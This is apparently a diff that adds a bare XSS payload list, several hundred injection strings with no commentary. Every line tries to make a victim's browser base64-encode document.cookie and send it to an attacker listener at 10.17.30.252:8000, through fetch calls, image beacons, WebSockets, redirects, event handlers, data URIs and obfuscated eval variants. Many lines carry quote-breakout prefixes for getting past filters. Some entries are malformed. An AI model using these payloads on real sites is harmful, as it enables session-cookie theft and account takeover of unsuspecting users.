@@ -1,0 +1,514 @@
+<script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie));</script>
+<script>new Image().src='http://10.17.30.252:8000/' + btoa(document.cookie);</script>
+<script>var xhttp = new XMLHttpRequest(); xhttp.open("GET", "http://10.17.30.252:8000/" + btoa(document.cookie), true); xhttp.send();</script>
+<script>fetch('http://10.17.30.252:8000/?c=' + btoa(document.cookie));</script>
+<form action="http://10.17.30.252:8000/" method="POST"><input type="hidden" name="data" value="<script>document.write(btoa(document.cookie));</script>"><input type="submit"></form><script>document.forms[0].submit();</script>
+<iframe src="http://10.17.30.252:8000/?c=" + btoa(document.cookie)></iframe>
+<script>var img = new Image(); img.src = 'http://10.17.30.252:8000/' + btoa(document.cookie);</script>
+<script>var script = document.createElement('script'); script.src = 'http://10.17.30.252:8000/' + btoa(document.cookie); document.body.appendChild(script);</script>
+<script src="http://10.17.30.252:8000/callback?c=" + btoa(document.cookie)></script>
+<script>var ws = new WebSocket('ws://10.17.30.252:8000'); ws.onopen = function() { ws.send(btoa(document.cookie)); };</script>
+<script>(function() { var c = btoa(document.cookie); fetch('http://10.17.30.252:8000/' + c); })();</script>
+<script>eval('fetch("http://10.17.30.252:8000/" + btoa(document.cookie))');</script>
+<script>var c = encodeURIComponent(btoa(document.cookie)); fetch('http://10.17.30.252:8000/?c=' + c);</script>
+<script>var c = ''; for (var i = 0; i < document.cookie.length; i++) { c += document.cookie.charCodeAt(i).toString(16); } fetch('http://10.17.30.252:8000/' + btoa(c));</script>
+<script>new Function('fetch("http://10.17.30.252:8000/" + btoa(document.cookie))')();</script>
+<script>setTimeout(function() { fetch('http://10.17.30.252:8000/' + btoa(document.cookie)); }, 1000);</script>
+<script>var x = document.createElement('img'); x.src = 'http://10.17.30.252:8000/' + btoa(document.cookie); document.body.appendChild(x);</script>
+<script>window.location = 'http://10.17.30.252:8000/' + btoa(document.cookie);</script>
+<script>var ws = new WebSocket('ws://10.17.30.252:8000'); ws.onopen = function() { ws.send(new Blob([btoa(document.cookie)])); };</script>
+<script>var a = document.createElement('a'); a.href = 'http://10.17.30.252:8000/' + btoa(document.cookie); document.body.appendChild(a); a.click();</script>
+<script>var a='\x66\x65\x74\x63\x68';var b='\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65';eval(a+'("http://10.17.30.252:8000/"+b+'+"('cookie')))</script>
+<script>var a='\146\145\164\143\150';var b='\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145';eval(a+'("http://10.17.30.252:8000/"+b+'+"('cookie')))</script>
+<script>var a='fetch';var b='document.cookie';eval(a+'("http://10.17.30.252:8000/"+b)')</script>
+<script>eval('&#102;&#101;&#116;&#99;&#104;("http://10.17.30.252:8000/"+btoa(document.cookie))')</script>
+<script>var a='f'+'e'+'t'+'c'+'h';var b='d'+'o'+'c'+'u'+'m'+'e'+'n'+'t'+'.'+'c'+'o'+'o'+'k'+'i'+'e';eval(a+'("http://10.17.30.252:8000/"+b)')</script>
+<script>eval('hctef'['reverse']().join('')+'("http://10.17.30.252:8000/"+btoa(document.cookie))')</script>
+<script>eval(unescape('%66%65%74%63%68')+'("http://10.17.30.252:8000/"+unescape("%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65"))')</script>
+<script>var a='\u0066\u0065\u0074\u0063\u0068';var b='doc\u0075ment.cookie';eval(a+'("http://10.17.30.252:8000/"+btoa(b))')</script>
+<script>Function('return fetch("http://10.17.30.252:8000/"+document.cookie)')()</script>
+<script>var _='e';var __='a';var _0='v';var _1='l';eval('f'+__+'tch("http://10.17.30.252:8000/"+btoa(document.cookie))')</script>
+<script>fetch    ("http://10.17.30.252:8000/"  +  btoa(document.cookie)    )</script>
+
+<script>
+fetch(
+"http://10.17.30.252:8000/" + 
+btoa(document.cookie)
+)
+</script>
+
+<script>
+/* comment */ fetch("http://10.17.30.252:8000/" /* comment */ + btoa(document.cookie)) /* comment */;
+</script>
+
+<script>fetch(String.fromCharCode(104,116,116,112,58,47,47,49,48,46,49,55,46,51,48,46,50,53,50,58,56,48,48,48,47) + btoa(document.cookie))</script>
+<img src="x" onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<a href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</a>
+<a href="data:text/html,<script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>">Click me</a>
+<a href="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjE3LjMwLjI1Mjo4MDAwLycrYXRvYShkb2N1bWVudC5jb29raWUpKTwvc2NyaXB0Pg==">Click me</a>
+<svg onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></svg>
+<svg><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script></svg>
+<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://10.17.30.252:8000/'+btoa(document.cookie)" /></svg>
+<scr%69pt>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</scr%69pt>
+<script src="http://10.17.30.252:8000/?callback=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></script>
+<iframe src="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<button onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">Click me</button>
+<script>location.href='http://10.17.30.252:8000/'+btoa(document.cookie)</script>
+<script>location.replace('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+<script>location.assign('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+<script>new Image().src='http://10.17.30.252:8000/'+btoa(document.cookie)</script>
+<form action="http://10.17.30.252:8000/'+btoa(document.cookie)" method="GET"></form><script>document.forms[0].submit();</script>
+<script>fetch('http://10.17.30.252:8000/', {method: 'POST', body: btoa(document.cookie)})</script>
+<iframe style="display:none" src="http://10.17.30.252:8000/'+btoa(document.cookie)"></iframe>
+<img style="display:none" src="http://10.17.30.252:8000/'+btoa(document.cookie)">
+<iframe src="https://www.youtube.com/embed/xyz?autoplay=1&origin=http://10.17.30.252:8000/'+btoa(document.cookie)"></iframe>
+<video onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></video>
+<audio onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></audio>
+<object data="http://10.17.30.252:8000/'+btoa(document.cookie)"></object>
+<a href="http://10.17.30.252:8000/'+btoa(document.cookie)">Click me</a>
+<img usemap="#m" src="x"><map name="m"><area shape="rect" coords="0,0,100,100" href="http://10.17.30.252:8000/'+btoa(document.cookie)"></map>
+>'"/</script><script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie));</script>
+">'</textarea></style></noscript><script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie));</script>
+<script>--></script><script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie));</script>
+"><script>var img = new Image(); img.src='http://10.17.30.252:8000/'+btoa(document.cookie);</script>
+'><script>document.location='http://10.17.30.252:8000/'+btoa(document.cookie);</script>
+"><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+'><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+"><body/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+'><body/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+"><iframe src="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><iframe src="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+"><link rel="stylesheet" href="data:text/css,*{background:url(http://10.17.30.252:8000/'+btoa(document.cookie))}">
+'><link rel="stylesheet" href="data:text/css,*{background:url(http://10.17.30.252:8000/'+btoa(document.cookie))}">
+"><input type="button" onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><input type="button" onclick="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+"><math href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><math href="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+"><meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+"><embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+"></embed>
+'><embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+"></embed>
+"><object data="data:text/html,<script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>"></object>
+'><object data="data:text/html,<script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>"></object>
+"><audio src="data:audio/x-wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAABCxAgAEABAAZGF0YVkAAABJ"></audio><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+'><audio src="data:audio/x-wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAABCxAgAEABAAZGF0YVkAAABJ"></audio><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+"><form action="http://10.17.30.252:8000/'+btoa(document.cookie)"></form><script>document.forms[0].submit();</script>
+'><form action="http://10.17.30.252:8000/'+btoa(document.cookie)"></form><script>document.forms[0].submit();</script>
+"><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+"><style>@import'http://10.17.30.252:8000/'+btoa(document.cookie);</style>
+'><style>@import'http://10.17.30.252:8000/'+btoa(document.cookie);</style>
+"><img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+">
+'><img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+">
+"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAUEBA..."><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+'><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAUEBA..."><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+"><meta charset="UTF-8"><img src="http://10.17.30.252:8000/'+btoa(document.cookie)">
+'><meta charset="UTF-8"><img src="http://10.17.30.252:8000/'+btoa(document.cookie)">
+"><iframe src="data:text/html,<script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>"></iframe>
+'><iframe src="data:text/html,<script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>"></iframe>
+"><link rel="prefetch" href="http://10.17.30.252:8000/'+btoa(document.cookie)">
+'><link rel="prefetch" href="http://10.17.30.252:8000/'+btoa(document.cookie)">
+"><base href="http://10.17.30.252:8000/'+btoa(document.cookie)">
+'><base href="http://10.17.30.252:8000/'+btoa(document.cookie)">
+"><svg onload="location='http://10.17.30.252:8000/'+btoa(document.cookie)"></svg>
+'><svg onload="location='http://10.17.30.252:8000/'+btoa(document.cookie)"></svg>
+"><input type="image" src="http://10.17.30.252:8000/'+btoa(document.cookie)">
+'><input type="image" src="http://10.17.30.252:8000/'+btoa(document.cookie)">
+"><meta http-equiv="set-cookie" content="name=123;path=/;domain=example.com"><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+'><meta http-equiv="set-cookie" content="name=123;path=/;domain=example.com"><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script>
+"><object type="text/html" data="http://10.17.30.252:8000/'+btoa(document.cookie)"></object>
+'><object type="text/html" data="http://10.17.30.252:8000/'+btoa(document.cookie)"></object>
+"><button onclick="location='http://10.17.30.252:8000/'+btoa(document.cookie)">Click</button>
+'><button onclick="location='http://10.17.30.252:8000/'+btoa(document.cookie)">Click</button>
+"><video onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></video>
+'><video onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></video>
+"><audio onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></audio>
+'><audio onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></audio>
+"><iframe onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></iframe>
+'><iframe onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></iframe>
+"><svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://10.17.30.252:8000/'+btoa(document.cookie)" /></svg>
+'><svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://10.17.30.252:8000/'+btoa(document.cookie)" /></svg>
+"><marquee onstart="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><marquee onstart="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+"><object onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></object>
+'><object onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></object>
+"><embed onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></embed>
+'><embed onload="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></embed>
+"><form onsubmit="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></form><input type="submit">
+'><form onsubmit="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"></form><input type="submit">
+"><img src="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><img src="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+"><svg><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script></svg>
+'><svg><script>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</script></svg>
+"><object data="data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+"></object>
+'><object data="data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+"></object>
+"><iframe src="data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+"></iframe>
+'><iframe src="data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+"></iframe>
+"><button onclick="location='http://10.17.30.252:8000/'+btoa(document.cookie)">Click me</button>
+'><button onclick="location='http://10.17.30.252:8000/'+btoa(document.cookie)">Click me</button>
+"><form action="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><input type="submit"></form>
+'><form action="javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))"><input type="submit"></form>
+'><script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie))</script>
+"><script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie))</script>
+"><img src="x" onerror="fetch('http://10.17.30.252:8000/' + btoa(document.cookie))">
+"><svg/onload=fetch('http://10.17.30.252:8000/' + btoa(document.cookie))>
+"><iframe src="javascript:fetch('http://10.17.30.252:8000/' + btoa(document.cookie))">
+"><input type="button" onclick="fetch('http://10.17.30.252:8000/' + btoa(document.cookie))">
+"><style>@import'http://10.17.30.252:8000/' + btoa(document.cookie);</style>
+"><img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+">
+"><meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/' + btoa(document.cookie))">
+"><form action="http://10.17.30.252:8000/' + btoa(document.cookie)"></form><script>document.forms[0].submit();</script>
+"><iframe src="data:text/html,<script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie))</script>"></iframe>
+"><link rel="stylesheet" href="data:text/css,*{background:url(http://10.17.30.252:8000/' + btoa(document.cookie))}">
+"><object type="text/html" data="http://10.17.30.252:8000/' + btoa(document.cookie)"></object>
+"><video onerror="fetch('http://10.17.30.252:8000/' + btoa(document.cookie))"></video>
+"><audio onerror="fetch('http://10.17.30.252:8000/' + btoa(document.cookie))"></audio>
+"><iframe onload="fetch('http://10.17.30.252:8000/' + btoa(document.cookie))"></iframe>
+"><marquee onstart="fetch('http://10.17.30.252:8000/' + btoa(document.cookie))">
+"><object onload="fetch('http://10.17.30.252:8000/' + btoa(document.cookie))"></object>
+"><embed onload="fetch('http://10.17.30.252:8000/' + btoa(document.cookie))"></embed>
+"><img src="javascript:fetch('http://10.17.30.252:8000/' + btoa(document.cookie))">
+"><svg><script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie))</script></svg>
+"><button onclick="location='http://10.17.30.252:8000/' + btoa(document.cookie)">Click me</button>
+"><form action="javascript:fetch('http://10.17.30.252:8000/' + btoa(document.cookie))"><input type="submit"></form>
+"><meta charset="UTF-8"><img src="http://10.17.30.252:8000/' + btoa(document.cookie)">
+"><iframe src="data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+"></iframe>
+"><object data="data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+"></object>
+"><svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://10.17.30.252:8000/' + btoa(document.cookie)" /></svg>
+"><img style="display:none" src="http://10.17.30.252:8000/' + btoa(document.cookie)">
+"><iframe style="display:none" src="http://10.17.30.252:8000/' + btoa(document.cookie)"></iframe>
+"><meta http-equiv="set-cookie" content="name=123;path=/;domain=example.com"><script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie))</script>
+"><base href="http://10.17.30.252:8000/' + btoa(document.cookie)">
+"><meta http-equiv="refresh" content="0;url=http://10.17.30.252:8000/' + btoa(document.cookie)">
+"><object data="http://10.17.30.252:8000/' + btoa(document.cookie)"></object>
+"><img usemap="#m" src="x"><map name="m"><area shape="rect" coords="0,0,100,100" href="http://10.17.30.252:8000/' + btoa(document.cookie)"></map>
+"><link rel="prefetch" href="http://10.17.30.252:8000/' + btoa(document.cookie)">
+"><link rel="stylesheet" type="text/css" href="http://10.17.30.252:8000/' + btoa(document.cookie)">
+"><meta name="referrer" content="no-referrer" /><script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie))</script>
+"><script src="data:text/javascript;base64,ZXZhbChiYW5kb29nbGUubWF0Y2goL1wKL2kp"></script>
+"><object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+"></object>
+"><object data="data:text/html;charset=utf-8;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+"></object>
+"><svg><g onload="fetch('http://10.17.30.252:8000/' + btoa(document.cookie))"></g></svg>
+"><svg><a xlink:href="http://10.17.30.252:8000/' + btoa(document.cookie)"></svg>
+"><form id="form" action="http://10.17.30.252:8000/' + btoa(document.cookie)"></form><input type="submit" form="form">
+"><input type="button" value="Submit" onclick="location.href='http://10.17.30.252:8000/' + btoa(document.cookie)">
+"><button form="form" type="submit"></button><form id="form" action="http://10.17.30.252:8000/' + btoa(document.cookie)"></form>
+"><button onclick="location='http://10.17.30.252:8000/' + btoa(document.cookie)">Click me</button>
+"><input type="button" value="Submit" onclick="document.location='http://10.17.30.252:8000/' + btoa(document.cookie)">
+"><iframe src="http://10.17.30.252:8000/' + btoa(document.cookie)"></iframe>
+"><link href="data:text/html,<script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie))</script>" rel="stylesheet">
+"><object data="data:text/html,<script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie))</script>"></object>
+"><iframe src="data:text/html,<script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie))</script>"></iframe>
+"><embed src="data:text/html,<script>fetch('http://10.17.30.252:8000/' + btoa(document.cookie))</script>"></embed>
+"><meta http-equiv="refresh" content="0;url=javascript:fetch('http://10.17.30.252:8000/' + btoa(document.cookie))">
+"><form action="javascript:fetch('http://10.17.30.252:8000/' + btoa(document.cookie))"><input type="submit"></form>
+"><input type="button" value="Submit" onclick="fetch('http://10.17.30.252:8000/' + btoa(document.cookie))">
+<"><sCrIpT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+,'"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+."><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+/"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+?><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+;"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+:<ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+\"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+{{"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+}{"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+"><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+/"><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+?"><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+;'><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+:"><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+,'><img src=x onerror="fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<"><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+'><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+/"><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+?<svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+;'><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+:"><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+,'><svg/onload=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+<"><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+'><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+/"><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+?<iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+;'><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+:"><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+,'><iframe src=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+<"><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+'><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+/"><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+?<input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+;'><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+:"><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+,'><input type=button onclick=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>
+<"><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+'><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+/"><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+?<form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+;'><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+:"><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+,'><form action=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))><input type=submit></form>
+"><meta http-equiv=refresh content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+'><meta http-equiv=refresh content="0;url=javascript:fetch('http://10.17.30.252:8000/'+btoa(document.cookie))">
+<"><link rel=stylesheet href=data:text/css,*{background:url(http://10.17.30.252:8000/'+btoa(document.cookie))}>
+'><link rel=stylesheet href=data:text/css,*{background:url(http://10.17.30.252:8000/'+btoa(document.cookie))}>
+"><object data=data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+>
+'><object data=data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+>
+"><iframe src=data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+>
+'><iframe src=data:application/xhtml+xml;base64,PHN2ZyBvbmxvYWQ9ZmV0Y2goJ2h0dHA6Ly8xMC4xNy4zMC4yNTI6ODAwMCcrYXRvYShkb2N1bWVudC5jb29raWUpKSI+>
+"><button onclick=location='http://10.17.30.252:8000/'+btoa(document.cookie)>Click me</button>
+'><button onclick=location='http://10.17.30.252:8000/'+btoa(document.cookie)>Click me</button>
+<"><meta charset=UTF-8><img src=http://10.17.30.252:8000/'+btoa(document.cookie)>
+'><meta charset=UTF-8><img src=http://10.17.30.252:8000/'+btoa(document.cookie)>
+"><audio onerror=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))></audio>
+'><audio onerror=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))></audio>
+"><svg><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT></svg>
+'><svg><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT></svg>
+/"><svg><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT></svg>
+?<svg><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT></svg>
+;'><svg><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT></svg>
+:"><svg><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT></svg>
+,'><svg><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT></svg>
+"><!--<img src=x onerror=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>-->
+'><--<img src=x onerror=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))>-->
+"><details open ontoggle=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))></details>
+'><details open ontoggle=fetch('http://10.17.30.252:8000/'+btoa(document.cookie))></details>
+"><!--<ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>-->
+'><--<ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>-->
+"><ScRipT src=//10.17.30.252:8000/btoa(document.cookie)></ScRipT>
+'><ScRipT src=//10.17.30.252:8000/btoa(document.cookie)></ScRipT>
+"><script src=//10.17.30.252:8000/btoa(document.cookie)></script>
+'><script src=//10.17.30.252:8000/btoa(document.cookie)></script>
+"><sCrIpT src=//10.17.30.252:8000/btoa(document.cookie)></sCrIpT>
+'><sCrIpT src=//10.17.30.252:8000/btoa(document.cookie)></sCrIpT>
+"><base href=//10.17.30.252:8000>
+'><base href=//10.17.30.252:8000>
+"><object data=//10.17.30.252:8000>
+'><object data=//10.17.30.252:8000>
+"><form action=//10.17.30.252:8000 method=POST>
+'><form action=//10.17.30.252:8000 method=POST>
+"><meta http-equiv=refresh content=0;url=//10.17.30.252:8000>
+'><meta http-equiv=refresh content=0;url=//10.17.30.252:8000>
+<"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+,'"><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
+."><ScRipT>fetch('http://10.17.30.252:8000/'+btoa(document.cookie))</ScRipT>
